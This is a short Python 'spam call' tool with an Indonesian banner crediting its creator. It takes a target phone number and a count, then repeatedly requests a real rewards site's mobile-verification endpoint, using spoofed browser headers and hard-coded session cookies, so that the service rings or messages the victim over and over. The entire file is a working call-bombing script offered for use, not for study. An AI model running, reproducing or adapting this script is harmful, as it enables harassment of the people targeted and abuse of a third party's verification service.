import requests,json,os,time

os.system("clear")
banner = """
             \t——————————————————
             \tSpam-Call-Terbaru
             \t——————————————————
———————————————————————————————————————————————————————
[+]| Creator   = Ihsan
   |———————————————————————————————————————————————————
[+]| instagram = ihsansptraa25
   |———————————————————————————————————————————————————
[+]| YOUTUBE   = Ihsan ID
———————————————————————————————————————————————————————
"""
print(banner)
nomor = input("[+] Nomor(8×××): ")
jumlah = int(input("[+] jumlah : "))

ua = {"Host":"id.jagreward.com",
"Connection":"keep-alive",
"Accept":"*/*",
"User-Agent":"Mozilla/5.0 (Linux; Android 6.0; S4Z) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
"X-Requested-With":"XMLHttpRequest",
"Sec-Fetch-Site":"same-origin",
"Sec-Fetch-Mode":"cors",
"Sec-Fetch-Dest":"empty",
"Referer":"https://id.jagreward.com/member/register/",
"Accept-Encoding":"gzip, deflate, br",
"Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,pt;q=0.6",
'Cookie':'PHPSESSID=g2q0kesi9pu597q76p9tirhtp5; DAPROPS="sjs.webGlRenderer:Mali-400 MP|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRatio:1.5|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:0|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0"; _ga=GA1.3.250230276.1614108734; _gid=GA1.3.1696977568.1614108734; _gat=1',
"Host":"id.jagreward.com",
"Connection":"keep-alive",
"Accept":"*/*",
"User-Agent":"Mozilla/5.0 (Linux; Android 6.0; S4Z) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
"X-Requested-With":"XMLHttpRequest",
"Sec-Fetch-Site":"same-origin",
"Sec-Fetch-Mode":"cors",
"Sec-Fetch-Dest":"empty",
"Referer":"https://id.jagreward.com/member/register/",
"Accept-Encoding":"gzip, deflate, br",
"Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,pt;q=0.6",
'Cookie':'PHPSESSID=g2q0kesi9pu597q76p9tirhtp5; DAPROPS="sjs.webGlRenderer:Mali-400 MP|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRatio:1.5|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:0|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0"; _ga=GA1.3.250230276.1614108734; _gid=GA1.3.1696977568.1614108734; _gat=1',
}
url = f"https://id.jagreward.com/member/verify-mobile/{nomor}/"
for i in range(int(jumlah)):
  req = requests.get(url,headers=ua).text
  sans = json.loads(req)
  xn = sans["result"]
  xx = sans["message"]
  print(f"result: {xn}, Message: {xx}")
  time.sleep(5)
